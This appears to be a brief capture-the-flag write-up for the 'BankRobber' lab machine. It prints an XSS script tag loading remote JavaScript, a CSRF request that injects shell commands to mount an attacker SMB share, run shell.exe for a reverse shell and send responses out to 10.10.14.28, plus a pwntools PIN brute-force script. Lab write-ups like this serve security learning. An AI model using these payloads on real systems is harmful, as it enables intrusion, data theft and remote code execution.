# BankRobber

this box starts of with doing a XSS to gain the admin credentials, and once we gain the admin, again, we use a CSRF to exploit a functionality to gain code execution

XSS Used:

```text
This is on the webpage
<script src="http://10.10.14.64/script.js"></script>
```

```text
This is the script.js, used to do CSRF or is this SSRF? idk

var xhr = new XMLHttpRequest();
xhr.open('post', 'http://localhost/admin/backdoorchecker.php', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;

# couldn't get this piece to work, but including it anyway
xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
        //if (xhr.status === 200 || xhr.status === 302) {
            console.log(xhr.response);
            console.log(xhr.responseText);
        document.write('<img src="http://10.10.14.28:81/abcd?data=' + btoa(xhr.responseText) + btoa(xhr.response)+'" />');
        //}
    }
};

establishing a share on the remote machine
xhr.send('cmd=dir | net use x: \\\\10.10.14.28\\kalishare /user:guest guest ');
#xhr.send('cmd=dir | x:\\shell.exe'); => this gets us reverse shell;
```

after getting a root shell, we see a process on port 910. on a bit usual stuff, it's a simple buffer overflow :\). This is the below python3 script used to brute-force the key on the executable

```text
from pwn import *

for i in range(0,9999):
  code = '0'*(4 - len(str(i))) + str(i)
  r = remote('localhost', '910', level='error')
  r.recvuntil(str.encode('[$]'))
  r.sendline(str.encode(code))
  resp = r.recvline()
  r.close()

  if str.encode("Access denied") not in resp:
    log.success('CODE: {}'.format(code))
    exit(1)
```

